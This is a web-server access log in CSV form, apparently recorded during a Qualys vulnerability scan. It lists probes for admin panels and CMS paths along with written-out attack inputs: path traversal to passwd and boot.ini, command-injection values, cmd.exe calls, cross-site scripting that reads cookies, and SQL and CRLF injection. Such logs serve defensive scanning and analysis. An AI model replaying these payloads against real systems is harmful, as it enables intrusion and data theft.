LogID,Created,Method,UriStem,UriQuery,IP,UserAgent,URL
3038,2021-01-10 07:08:07,GET,/query,mss=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,,172.17.100.122,-,-
3039,2021-01-10 07:08:07,GET,/Kentico/,-,,172.17.100.122,-,-
3040,2021-01-10 07:08:07,GET,/dwrdemo/,-,,172.17.100.122,-,-
3041,2021-01-10 07:08:07,GET,/shopper.cgi,newpage=../../../../../../../../boot.ini,,172.17.100.122,-,-
3042,2021-01-10 07:08:07,GET,/administrator/manifests/files/,-,,172.17.100.122,-,-
3043,2021-01-10 07:08:07,GET,/commerce.cgi,page=../../../../../../windows/system32/drivers/etc/hosts%00index.html,,172.17.100.122,-,-
3044,2021-01-10 07:08:07,GET,/joomla/administrator/manifests/files/,-,,172.17.100.122,-,-
3045,2021-01-10 07:08:07,GET,/application/,-,,172.17.100.122,-,-
3046,2021-01-10 07:08:07,GET,/Joomla/administrator/manifests/files/,-,,172.17.100.122,-,-
3047,2021-01-10 07:08:07,GET,/app/,-,,172.17.100.122,-,-
3048,2021-01-10 07:08:07,GET,/network_query.php,portNum=80&queryType=all&target=q5u4a3l2y1s.com%3Bcat+c:\boot.ini&Submit=Do+It,,172.17.100.122,-,-
3049,2021-01-10 07:08:07,GET,/content/administrator/manifests/files/,-,,172.17.100.122,-,-
3050,2021-01-10 07:08:07,GET,/web-app/,-,,172.17.100.122,-,-
3051,2021-01-10 07:08:07,GET,/nqt.php,portNum=80&queryType=all&target=q5u4a3l2y1s.com%3Bcat+c:\boot.ini&Submit=Do+It,,172.17.100.122,-,-
3052,2021-01-10 07:08:07,GET,/cms/administrator/manifests/files/,-,,172.17.100.122,-,-
3053,2021-01-10 07:08:07,GET,/dwrdemo/dwr/,-,,172.17.100.122,-,-
3054,2021-01-10 07:08:07,GET,/sdbsearch.cgi,-,,172.17.100.122,-,-
3055,2021-01-10 07:08:07,GET,/Content/administrator/manifests/files/,-,,172.17.100.122,-,-
3056,2021-01-10 07:08:07,GET,/application/dwr/,-,,172.17.100.122,-,-
3057,2021-01-10 07:08:07,GET,/sdbsearch_en.cgi,-,,172.17.100.122,-,-
3058,2021-01-10 07:08:07,GET,/CMS/administrator/manifests/files/,-,,172.17.100.122,-,-
3059,2021-01-10 07:08:07,GET,/app/dwr/,-,,172.17.100.122,-,-
3060,2021-01-10 07:08:07,GET,/sdbsearch_de.cgi,-,,172.17.100.122,-,-
3061,2021-01-10 07:08:07,GET,/news/administrator/manifests/files/,-,,172.17.100.122,-,-
3062,2021-01-10 07:08:07,GET,/web-app/dwr/,-,,172.17.100.122,-,-
3063,2021-01-10 07:08:07,GET,/sdbsearch_fr.cgi,-,,172.17.100.122,-,-
3064,2021-01-10 07:08:07,GET,/blog/administrator/manifests/files/,-,,172.17.100.122,-,-
3065,2021-01-10 07:08:07,GET,/demo/dwr/,-,,172.17.100.122,-,-
3066,2021-01-10 07:08:07,GET,/sdbsearch_cz.cgi,-,,172.17.100.122,-,-
3067,2021-01-10 07:08:07,GET,/site/administrator/manifests/files/,-,,172.17.100.122,-,-
3068,2021-01-10 07:08:07,GET,/Portal/,-,,172.17.100.122,-,-
3069,2021-01-10 07:08:07,GET,/sdbsearch_it.cgi,-,,172.17.100.122,-,-
3070,2021-01-10 07:08:07,GET,/test/administrator/manifests/files/,-,,172.17.100.122,-,-
3071,2021-01-10 07:08:07,GET,/Liferay/,-,,172.17.100.122,-,-
3072,2021-01-10 07:08:07,GET,/sdbsearch_kr.cgi,-,,172.17.100.122,-,-
3073,2021-01-10 07:08:07,GET,/atlassian/,-,,172.17.100.122,-,-
3074,2021-01-10 07:08:07,GET,/en/web/airlines/,-,,172.17.100.122,-,-
3075,2021-01-10 07:08:07,get,/aspnet_client/,-,,172.17.100.122,-,-
3076,2021-01-10 07:08:07,GET,/sdbsearch_hu.cgi,-,,172.17.100.122,-,-
3077,2021-01-10 07:08:07,GET,/corp/,-,,172.17.100.122,-,-
3078,2021-01-10 07:08:07,GET,/api/,-,,172.17.100.122,-,-
3079,2021-01-10 07:08:07,GET,/aspnet_client/redirect.asp,url=<script>alert(5341)</script>,,172.17.100.122,-,-
3080,2021-01-10 07:08:07,GET,/index.php3,-,,172.17.100.122,-,-
3081,2021-01-10 07:08:07,GET,/share/,-,,172.17.100.122,-,-
3082,2021-01-10 07:08:07,GET,/client/,-,,172.17.100.122,-,-
3083,2021-01-10 07:08:07,GET,/aspnet_client/_mmDBScripts/MMHTTPDB.asp,-,,172.17.100.122,-,-
3084,2021-01-10 07:08:07,GET,/stats.php,-,,172.17.100.122,-,-
3085,2021-01-10 07:08:07,GET,/cmsms/,-,,172.17.100.122,-,-
3086,2021-01-10 07:08:07,GET,/Admin/,-,,172.17.100.122,-,-
3087,2021-01-10 07:08:07,GET,/aspnet_client/_mmServerScripts/MMHTTPDB.asp,-,,172.17.100.122,-,-
3088,2021-01-10 07:08:07,GET,/html2wml.cgi,file=/q39j_57wg__.html,,172.17.100.122,-,-
3089,2021-01-10 07:08:07,GET,/cmsmadesimple/,-,,172.17.100.122,-,-
3090,2021-01-10 07:08:07,GET,/FormMail.pl,-,,172.17.100.122,-,-
3091,2021-01-10 07:08:07,GET,/controls/cms/,-,,172.17.100.122,-,-
3092,2021-01-10 07:08:07,GET,/aspnet_client/cmd.exe,/c+dir,,172.17.100.122,-,-
3093,2021-01-10 07:08:08,GET,/catgy.cgi,key=0&cartname=0&desc=<script>alert('qualys')</script>,,172.17.100.122,-,-
3094,2021-01-10 07:08:08,GET,/xampp/cmsmadesimple/,-,,172.17.100.122,-,-
3095,2021-01-10 07:08:08,GET,/nph-maillist.pl,-,,172.17.100.122,-,-
3096,2021-01-10 07:08:08,GET,/aspnet_client/phpinfo.php,-,,172.17.100.122,-,-
3097,2021-01-10 07:08:08,GET,/common/admin/Jobs2/,-,,172.17.100.122,-,-
3098,2021-01-10 07:08:08,GET,/modules.php,name=Members_List&&sql_debug=1,,172.17.100.122,-,-
3099,2021-01-10 07:08:08,GET,/wamp/cmsmadesimple/,-,,172.17.100.122,-,-
3100,2021-01-10 07:08:08,GET,/websync.exe,-,,172.17.100.122,-,-
3101,2021-01-10 07:08:08,GET,/aspnet_client/.user.ini,-,,172.17.100.122,-,-
3102,2021-01-10 07:08:08,GET,/Telerik/,-,,172.17.100.122,-,-
3103,2021-01-10 07:08:08,GET,/FormMail.pl,recipient=blackhole%40qualys.com,,172.17.100.122,-,-
3104,2021-01-10 07:08:08,GET,/cms-made-simple/,-,,172.17.100.122,-,-
3105,2021-01-10 07:08:08,GET,/banners.php,op=Change&bid=-1&url=http://not.used,,172.17.100.122,-,-
3106,2021-01-10 07:08:08,GET,/formmail.pl,recipient=blackhole%40qualys.com,,172.17.100.122,-,-
3107,2021-01-10 07:08:08,GET,/DesktopModules/Admin/RadEditorProvider/,-,,172.17.100.122,-,-
3108,2021-01-10 07:08:08,GET,/TYPO3/,-,,172.17.100.122,-,-
3109,2021-01-10 07:08:08,POST,/admin.php,-,,172.17.100.122,-,-
3110,2021-01-10 07:08:08,GET,/FormMail.pl,recipient=blackhole%40qualys.com,,172.17.100.122,-,-
3111,2021-01-10 07:08:08,GET,/Providers/HtmlEditorProviders/Telerik/,-,,172.17.100.122,-,-
3112,2021-01-10 07:08:08,GET,/xampp/typo3/,-,,172.17.100.122,-,-
3113,2021-01-10 07:08:08,GET,/adpassword.txt,-,,172.17.100.122,-,-
3114,2021-01-10 07:08:08,GET,/formmail.pl,recipient=blackhole%40qualys.com,,172.17.100.122,-,-
3115,2021-01-10 07:08:08,GET,/telerik/,-,,172.17.100.122,-,-
3116,2021-01-10 07:08:08,GET,/phptest.php,-,,172.17.100.122,-,-
3117,2021-01-10 07:08:08,GET,/wamp/typo3/,-,,172.17.100.122,-,-
3118,2021-01-10 07:08:08,POST,/ubb6_test.cgi,-,,172.17.100.122,-,-
3119,2021-01-10 07:08:08,GET,/phpinfo.php3,-,,172.17.100.122,-,-
3120,2021-01-10 07:08:08,GET,/2014/admin,-,,172.17.100.122,-,-
3121,2021-01-10 07:08:08,GET,/phpCMS/,-,,172.17.100.122,-,-
3122,2021-01-10 07:08:08,GET,/wwwthreads.pl,-,,172.17.100.122,-,-
3123,2021-01-10 07:08:08,GET,/info.php3,-,,172.17.100.122,-,-
3124,2021-01-10 07:08:08,GET,/nexus,-,,172.17.100.122,-,-
3125,2021-01-10 07:08:08,GET,/example/HelloWorld!UndefinedMethod_QUALYS.action,-,,172.17.100.122,-,-
3126,2021-01-10 07:08:08,GET,/xampp/phpcms/,-,,172.17.100.122,-,-
3127,2021-01-10 07:08:08,GET,/ubbthreads.php,-,,172.17.100.122,-,-
3128,2021-01-10 07:08:08,GET,/php.php3,-,,172.17.100.122,-,-
3129,2021-01-10 07:08:08,GET,/index.action,-,,172.17.100.122,-,-
3130,2021-01-10 07:08:08,GET,/trinidad/,-,,172.17.100.122,-,-
3131,2021-01-10 07:08:08,GET,/wamp/phpcms/,-,,172.17.100.122,-,-
3132,2021-01-10 07:08:08,GET,/phptest.php3,-,,172.17.100.122,-,-
3133,2021-01-10 07:08:08,GET,/index.php/123,-,,172.17.100.122,-,-
3134,2021-01-10 07:08:08,GET,/trinidad/faces/,-,,172.17.100.122,-,-
3135,2021-01-10 07:08:08,GET,/example/HelloWorld.action,-,,172.17.100.122,-,-
3136,2021-01-10 07:08:08,GET,/Owa/,-,,172.17.100.122,-,-
3137,2021-01-10 07:08:08,GET,/allmanage.pl,-,,172.17.100.122,-,-
3138,2021-01-10 07:08:08,OPTIONS,/index.php,-,,172.17.100.122,-,-
3139,2021-01-10 07:08:08,GET,/umbraco/,-,,172.17.100.122,-,-
3140,2021-01-10 07:08:08,GET,/,-,,172.17.100.122,-,-
3141,2021-01-10 07:08:08,GET,/allmanage.cgi,-,,172.17.100.122,-,-
3142,2021-01-10 07:08:08,GET,/struts2-showcase/,-,,172.17.100.122,-,-
3143,2021-01-10 07:08:08,GET,/Umbraco/,-,,172.17.100.122,-,-
3144,2021-01-10 07:08:08,GET,/,-,,172.17.100.122,Mozilla/5.0+(Windows;+U;+Windows+NT+5.1;+en-US;+rv:1.9.0.18)+Gecko/2010020220+Firefox/3.0.18+(.NET+CLR+3.5.30729),-
3145,2021-01-10 07:08:08,GET,/config/config.txt,-,,172.17.100.122,-,-
3146,2021-01-10 07:08:08,GET,/Struts/,-,,172.17.100.122,-,-
3147,2021-01-10 07:08:08,GET,/site/,-,,172.17.100.122,-,-
3148,2021-01-10 07:08:08,GET,/qualys_i_dont_exist,-,,172.17.100.122,-,-
3149,2021-01-10 07:08:08,GET,/perl-status,-,,172.17.100.122,-,-
3150,2021-01-10 07:08:08,GET,/guestbook_entries/,-,,172.17.100.122,-,-
3151,2021-01-10 07:08:08,GET,/struts2-showcase2/,-,,172.17.100.122,-,-
3152,2021-01-10 07:08:08,GET,/qualys_i_dont_exist,-,,172.17.100.122,-,-
3153,2021-01-10 07:08:08,GET,/texis.exe,-dump,,172.17.100.122,-,-
3154,2021-01-10 07:08:08,GET,/2014/guestbook_entries/,-,,172.17.100.122,-,-
3155,2021-01-10 07:08:08,GET,/redirect/,-,,172.17.100.122,-,-
3156,2021-01-10 07:08:08,GET,/.*,-,,172.17.100.122,Mozilla/5.0+(Windows+NT+10.0;+WOW64;+rv:52.0)+Gecko/20100101+Firefox/52.0,-
3157,2021-01-10 07:08:08,GET,/redirect.asp,url=<script>alert(5341)</script>,,172.17.100.122,-,-
3158,2021-01-10 07:08:08,GET,/blog/guestbook_entries/,-,,172.17.100.122,-,-
3159,2021-01-10 07:08:08,GET,/primefaces/,-,,172.17.100.122,-,-
3160,2021-01-10 07:08:08,GET,/fullnews.php,id=%3Cscript%3Ealert(qualys);%3C/script%3E,,172.17.100.122,-,-
3161,2021-01-10 07:08:08,GET,/,-,,172.17.100.122,Mozilla/5.0+(Windows+NT+10.0;+WOW64;+rv:51.0)+Gecko/20100101+Firefox/51.0,-
3162,2021-01-10 07:08:08,GET,/php.exe,C:\boot.ini,,172.17.100.122,-,-
3163,2021-01-10 07:08:08,GET,/content/guestbook_entries/,-,,172.17.100.122,-,-
3164,2021-01-10 07:08:08,GET,/PrimeFaces/,-,,172.17.100.122,-,-
3165,2021-01-10 07:08:08,GET,/,-,,172.17.100.122,Mozilla/5.0+(Windows+NT+10.0;+WOW64;+rv:52.0)+Gecko/20100101+Firefox/52.0,-
3166,2021-01-10 07:08:08,GET,/login.asp,-,,172.17.100.122,-,-
3167,2021-01-10 07:08:08,GET,/,-,,172.17.100.122,-,-
3168,2021-01-10 07:08:08,GET,/Content/guestbook_entries/,-,,172.17.100.122,-,-
3169,2021-01-10 07:08:08,GET,/primefaces/javax.faces.resource/,-,,172.17.100.122,-,-
3170,2021-01-10 07:08:08,GET,/phpinfo.php,-,,172.17.100.122,-,-
3171,2021-01-10 07:08:08,GET,/register.asp,-,,172.17.100.122,-,-
3172,2021-01-10 07:08:08,GET,/add_user.php,-,,172.17.100.122,-,-
3173,2021-01-10 07:08:08,GET,/CMS/guestbook_entries/,-,,172.17.100.122,-,-
3174,2021-01-10 07:08:08,GET,/.*,-,,172.17.100.122,-,-
3175,2021-01-10 07:08:08,GET,/PrimeFaces/javax.faces.resource/,-,,172.17.100.122,-,-
3176,2021-01-10 07:08:08,GET,/index.asp,-,,172.17.100.122,-,-
3177,2021-01-10 07:08:08,GET,/main.php,-,,172.17.100.122,-,-
3178,2021-01-10 07:08:08,GET,/cms/guestbook_entries/,-,,172.17.100.122,-,-
3179,2021-01-10 07:08:08,GET,/javax.faces.resource/,-,,172.17.100.122,-,-
3180,2021-01-10 07:08:08,GET,/admin/modules/blocks.php/admin.php,-,,172.17.100.122,-,-
3181,2021-01-10 07:08:08,GET,/default.asp,-,,172.17.100.122,-,-
3182,2021-01-10 07:08:08,GET,/news/guestbook_entries/,-,,172.17.100.122,-,-
3183,2021-01-10 07:08:08,GET,/index.html,-,,172.17.100.122,-,-
3184,2021-01-10 07:08:08,GET,/squash/,-,,172.17.100.122,-,-
3185,2021-01-10 07:08:08,GET,/recipe_view.php,intId=char%2839%29%2b%28SELECT,,172.17.100.122,-,-
3186,2021-01-10 07:08:08,GET,/discuss/guestbook_entries/,-,,172.17.100.122,-,-
3187,2021-01-10 07:08:08,GET,/index.htm,-,,172.17.100.122,-,-
3188,2021-01-10 07:08:08,GET,/squash-TM/,-,,172.17.100.122,-,-
3189,2021-01-10 07:08:08,GET,/recipe_search.php,searchstring=<script>alert(document.domain);</script>,,172.17.100.122,-,-
3190,2021-01-10 07:08:08,GET,/2014/products/213/,-,,172.17.100.122,-,-
3191,2021-01-10 07:08:08,GET,/default.html,-,,172.17.100.122,-,-
3192,2021-01-10 07:08:08,GET,/server/php/,-,,172.17.100.122,-,-
3193,2021-01-10 07:08:08,GET,/no5_such3_file7.pl,"""><script>alert(73541);</script>",,172.17.100.122,-,-
3194,2021-01-10 07:08:08,GET,/opensourcepos-2.4/,-,,172.17.100.122,-,-
3195,2021-01-10 07:08:08,GET,/default.htm,-,,172.17.100.122,-,-
3196,2021-01-10 07:08:08,GET,/example/,-,,172.17.100.122,-,-
3197,2021-01-10 07:08:08,GET,/no5_such3_file7.cgi,"""><script>alert(73541);</script>",,172.17.100.122,-,-
3198,2021-01-10 07:08:08,GET,/backups,-,,172.17.100.122,-,-
3199,2021-01-10 07:08:08,GET,/main.html,-,,172.17.100.122,-,-
3200,2021-01-10 07:08:08,GET,/assets/plugins/,-,,172.17.100.122,-,-
3201,2021-01-10 07:08:08,GET,/no5_such3_file7.php,"""><script>alert(73541);</script>",,172.17.100.122,-,-
3202,2021-01-10 07:08:08,GET,/dokuwiki,-,,172.17.100.122,-,-
3203,2021-01-10 07:08:08,GET,/main.htm,-,,172.17.100.122,-,-
3204,2021-01-10 07:08:08,GET,/javascript/,-,,172.17.100.122,-,-
3205,2021-01-10 07:08:08,GET,/sewse.exe,-,,172.17.100.122,-,-
3206,2021-01-10 07:08:08,GET,/op5config,-,,172.17.100.122,-,-
3207,2021-01-10 07:08:08,GET,/index.asp,-,,172.17.100.122,-,-
3208,2021-01-10 07:08:08,GET,/public/assets/lib/,-,,172.17.100.122,-,-
3209,2021-01-10 07:08:08,GET,/sewse.cgi,-,,172.17.100.122,-,-
3210,2021-01-10 07:08:08,GET,/struts2-rest-showcase/,-,,172.17.100.122,-,-
3211,2021-01-10 07:08:08,GET,/modules.php,name=News&file=friend&op=StorySent&title=%253cscript%3Ealert%2528document.cookie);%253c/script%3E,,172.17.100.122,-,-
3212,2021-01-10 07:08:08,GET,/public/,-,,172.17.100.122,-,-
3213,2021-01-10 07:08:08,GET,/sewse.cgi,-,,172.17.100.122,-,-
3214,2021-01-10 07:08:08,GET,/SYMPHONY/,-,,172.17.100.122,-,-
3215,2021-01-10 07:08:08,GET,/_mmDBScripts/MMHTTPDB.asp,-,,172.17.100.122,-,-
3216,2021-01-10 07:08:08,GET,/jquery-file-upload/,-,,172.17.100.122,-,-
3217,2021-01-10 07:08:08,GET,/sewse.exe,-,,172.17.100.122,-,-
3218,2021-01-10 07:08:08,GET,/_mmServerScripts/MMHTTPDB.asp,-,,172.17.100.122,-,-
3219,2021-01-10 07:08:08,GET,/jQuery-File-Upload/,-,,172.17.100.122,-,-
3220,2021-01-10 07:08:08,GET,/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3221,2021-01-10 07:08:08,GET,/htsearch,-,,172.17.100.122,-,-
3222,2021-01-10 07:08:08,POST,/down.asp,-,,172.17.100.122,-,-
3223,2021-01-10 07:08:08,GET,/jkmanager/,-,,172.17.100.122,-,-
3224,2021-01-10 07:08:08,GET,/joomla/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3225,2021-01-10 07:08:08,GET,/htsearch,-,,172.17.100.122,-,-
3226,2021-01-10 07:08:08,GET,/ver.asp,-,,172.17.100.122,-,-
3227,2021-01-10 07:08:08,GET,/jk-status/,-,,172.17.100.122,-,-
3228,2021-01-10 07:08:08,GET,/Joomla/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3229,2021-01-10 07:08:08,GET,/search.cgi,-,,172.17.100.122,-,-
3230,2021-01-10 07:08:08,GET,/nc.exe,-h,,172.17.100.122,-,-
3231,2021-01-10 07:08:08,GET,/jkstatus-auth/,-,,172.17.100.122,-,-
3232,2021-01-10 07:08:08,GET,/content/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3233,2021-01-10 07:08:08,GET,/netpad.cgi,-,,172.17.100.122,-,-
3234,2021-01-10 07:08:08,GET,/netcat.exe,-h,,172.17.100.122,-,-
3235,2021-01-10 07:08:08,GET,/jkmanager-auth/,-,,172.17.100.122,-,-
3236,2021-01-10 07:08:08,GET,/cms/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3237,2021-01-10 07:08:08,GET,/webnews.cgi,cmd=display,,172.17.100.122,-,-
3238,2021-01-10 07:08:08,GET,/ncx.exe,-h,,172.17.100.122,-,-
3239,2021-01-10 07:08:08,GET,/jdkstatus/,-,,172.17.100.122,-,-
3240,2021-01-10 07:08:08,GET,/Content/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3241,2021-01-10 07:08:08,GET,/webnews.cgi,cmd=display,,172.17.100.122,-,-
3242,2021-01-10 07:08:08,GET,/dllhosts.exe,-h,,172.17.100.122,-,-
3243,2021-01-10 07:08:08,GET,/js/jquery/,-,,172.17.100.122,-,-
3244,2021-01-10 07:08:08,GET,/CMS/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3245,2021-01-10 07:08:08,GET,/dnewsweb,-,,172.17.100.122,-,-
3246,2021-01-10 07:08:08,GET,/cmd.exe,/c+dir,,172.17.100.122,-,-
3247,2021-01-10 07:08:08,GET,/jquery/,-,,172.17.100.122,-,-
3248,2021-01-10 07:08:08,GET,/news/administrator/components/com_j2store/,-,,172.17.100.122,-,-
3249,2021-01-10 07:08:08,GET,/guestbook.pl,-,,172.17.100.122,-,-
3250,2021-01-10 07:08:08,GET,/ftp.exe,-h,,172.17.100.122,-,-
3251,2021-01-10 07:08:08,GET,/lib/jquery/,-,,172.17.100.122,-,-
3252,2021-01-10 07:08:08,GET,/Drupal/,-,,172.17.100.122,-,-
3253,2021-01-10 07:08:08,GET,/cgiforum.pl,-,,172.17.100.122,-,-
3254,2021-01-10 07:08:08,GET,/cmdasp.asp,-,,172.17.100.122,-,-
3255,2021-01-10 07:08:08,GET,/lib/jquery.js/,-,,172.17.100.122,-,-
3256,2021-01-10 07:08:08,GET,/vBulletin/,-,,172.17.100.122,-,-
3257,2021-01-10 07:08:08,GET,/modules.php,name=Splatt_Forum,,172.17.100.122,-,-
3258,2021-01-10 07:08:08,GET,/cmd.asp,-,,172.17.100.122,-,-
3259,2021-01-10 07:08:08,GET,/lib/js/jquery/,-,,172.17.100.122,-,-
3260,2021-01-10 07:08:08,GET,/modules/,-,,172.17.100.122,-,-
3261,2021-01-10 07:08:08,GET,/cwmail.exe,-,,172.17.100.122,-,-
3262,2021-01-10 07:08:08,GET,/hk.exe,boom,,172.17.100.122,-,-
3263,2021-01-10 07:08:08,GET,/2014/javascript/,-,,172.17.100.122,-,-
3264,2021-01-10 07:08:08,GET,/drupal/modules/,-,,172.17.100.122,-,-
3265,2021-01-10 07:08:08,GET,/comments/browse.php,fid=2&tid=4&go=%3Cscript%3Ealert(document.cookie)%3C/script%3E,,172.17.100.122,-,-
3266,2021-01-10 07:08:08,GET,/RELEASE-NOTES,-,,172.17.100.122,-,-
3267,2021-01-10 07:08:08,GET,/suremdm/,-,,172.17.100.122,-,-
3268,2021-01-10 07:08:08,GET,/Drupal/modules/,-,,172.17.100.122,-,-
3269,2021-01-10 07:08:08,GET,/del.php,-,,172.17.100.122,-,-
3270,2021-01-10 07:08:08,GET,/imagewin.php,"file=""><script>alert(document.cookie)</script>",,172.17.100.122,-,-
3271,2021-01-10 07:08:08,GET,/dsview/,-,,172.17.100.122,-,-
3272,2021-01-10 07:08:08,GET,/blog/modules/,-,,172.17.100.122,-,-
3273,2021-01-10 07:08:08,GET,/plugin.php,-,,172.17.100.122,-,-
3274,2021-01-10 07:08:08,GET,/view.php,gid=1&phid=0&img_size=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,,172.17.100.122,-,-
3275,2021-01-10 07:08:08,GET,/thinkphp/,-,,172.17.100.122,-,-
3276,2021-01-10 07:08:08,GET,/content/modules/,-,,172.17.100.122,-,-
3277,2021-01-10 07:08:08,GET,/plugin.php,-,,172.17.100.122,-,-
3278,2021-01-10 07:08:08,GET,/include/footer.php,t_login=<script>alert(document.cookie)</script>,,172.17.100.122,-,-
3279,2021-01-10 07:08:08,GET,/thinkphp/public/,-,,172.17.100.122,-,-
3280,2021-01-10 07:08:08,GET,/globals.php,-,,172.17.100.122,-,-
3281,2021-01-10 07:08:08,GET,/hints.pl,|id|,,172.17.100.122,-,-
3282,2021-01-10 07:08:08,GET,/tp5/public/,-,,172.17.100.122,-,-
3283,2021-01-10 07:08:08,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3284,2021-01-10 07:08:08,GET,/globals.php3,-,,172.17.100.122,-,-
3285,2021-01-10 07:08:08,GET,/usr/root/usrinfo.xml,-,,172.17.100.122,-,-
3286,2021-01-10 07:08:08,GET,/noneCMS/public/,-,,172.17.100.122,-,-
3287,2021-01-10 07:08:08,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3288,2021-01-10 07:08:08,GET,/install.php,-,,172.17.100.122,-,-
3289,2021-01-10 07:08:08,GET,/Documentation/tests/bug-559668.php,FORUM[LIB]=../../../../../../../boot.ini%00,,172.17.100.122,-,-
3290,2021-01-10 07:08:08,GET,/nonecms/public/,-,,172.17.100.122,-,-
3291,2021-01-10 07:08:08,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3292,2021-01-10 07:08:08,GET,/midicart.mdb,-,,172.17.100.122,-,-
3293,2021-01-10 07:08:08,GET,/main.html,-,,172.17.100.122,-,-
3294,2021-01-10 07:08:08,GET,/noneCms/public/,-,,172.17.100.122,-,-
3295,2021-01-10 07:08:08,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3296,2021-01-10 07:08:08,GET,/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/boot.ini,-,,172.17.100.122,-,-
3297,2021-01-10 07:08:08,PUT,/test_put_qualys07zQo1oz,-,,172.17.100.122,-,-
3298,2021-01-10 07:08:08,GET,/drupal/core/,-,,172.17.100.122,-,-
3299,2021-01-10 07:08:08,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3300,2021-01-10 07:08:08,GET,/�,€®�,,€®/�,€®�,€®/�
3301,2021-01-10 07:08:08,GET,/jmx-console/,-,,172.17.100.122,-,-
3302,2021-01-10 07:08:08,GET,/Drupal/core/,-,,172.17.100.122,-,-
3303,2021-01-10 07:08:08,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3304,2021-01-10 07:08:08,GET,/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/ð€€®ð€€®/boot.ini,-,,172.17.100.122,-,-
3305,2021-01-10 07:08:08,GET,/web-console/,-,,172.17.100.122,-,-
3306,2021-01-10 07:08:08,GET,/repos/updates/,-,,172.17.100.122,-,-
3307,2021-01-10 07:08:08,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3308,2021-01-10 07:08:08,GET,/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/ø€€€®ø€€€®/boot.ini,-,,172.17.100.122,-,-
3309,2021-01-10 07:08:09,GET,/repos/base/,-,,172.17.100.122,-,-
3310,2021-01-10 07:08:09,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3311,2021-01-10 07:08:09,GET,/penctl.cgi,-,,172.17.100.122,-,-
3312,2021-01-10 07:08:09,POST,/login.php,-,,172.17.100.122,-,-
3313,2021-01-10 07:08:09,GET,/vpn/,-,,172.17.100.122,-,-
3314,2021-01-10 07:08:09,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3315,2021-01-10 07:08:09,GET,/redir.php,url=http://www.qualys.com/%0d%0a%0d%0a<script>alert(84943)</script><!--,,172.17.100.122,-,-
3316,2021-01-10 07:08:09,POST,/cms/templates/standard/index.php,mode=weblinks,,172.17.100.122,-,-
3317,2021-01-10 07:08:09,GET,/ssl/,-,,172.17.100.122,-,-
3318,2021-01-10 07:08:09,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3319,2021-01-10 07:08:09,GET,/quick_reply.php,-,,172.17.100.122,-,-
3320,2021-01-10 07:08:09,GET,/moin.wsgi/NonExistantUser,"action=edit&template=<script>alert(""Qualys_XSS"")</script>",,172.17.100.122,-,-
3321,2021-01-10 07:08:09,GET,/console/,-,,172.17.100.122,-,-
3322,2021-01-10 07:08:09,GET,/console/login/LoginForm.jsp,-,,172.17.100.122,-,-
3323,2021-01-10 07:08:09,GET,/phpinfo.php,-,,172.17.100.122,-,-
3324,2021-01-10 07:08:09,POST,/invoker/JMXInvokerServlet,-,,172.17.100.122,Mozilla/5.0+(Windows;+U;+Windows+NT+5.1;+en-US;+rv:1.9.0.18)+Gecko/2010020220+Firefox/3.0.18+(.NET+CLR+3.5.30729),-
